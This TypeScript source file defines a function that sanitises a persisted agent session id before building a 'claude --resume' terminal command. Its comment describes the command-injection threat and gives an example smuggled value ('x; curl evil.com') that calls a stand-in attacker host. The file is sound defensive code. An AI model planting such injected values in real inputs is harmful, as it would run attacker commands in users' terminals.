/**
 * Build the `claude --resume <id>` launch line for a terminal's learned agent session.
 *
 * SECURITY: `agentSessionId` is persisted in canvas.json, which a SHARED or third-party project
 * file can craft (e.g. `"x; curl evil.com"`). Unlike `launchCommand` it is NOT trusted-user input,
 * yet it is written verbatim into the PTY — so it must be sanitised or it becomes a command
 * injection the moment a user clicks "Resume session". Claude session ids are UUIDs (alphanumeric
 * plus `-`/`_`); strip everything else so no shell metacharacter or whitespace survives as its own
 * token. If nothing valid remains, return `undefined` so the caller falls back to a fresh launch
 * instead of resuming with a bogus id.
 */
export function resumeCommand(agentSessionId: string | undefined): string | undefined {
  const sid = (agentSessionId ?? '').replace(/[^a-zA-Z0-9_-]/g, '')
  return sid ? `claude --resume ${sid}` : undefined
}
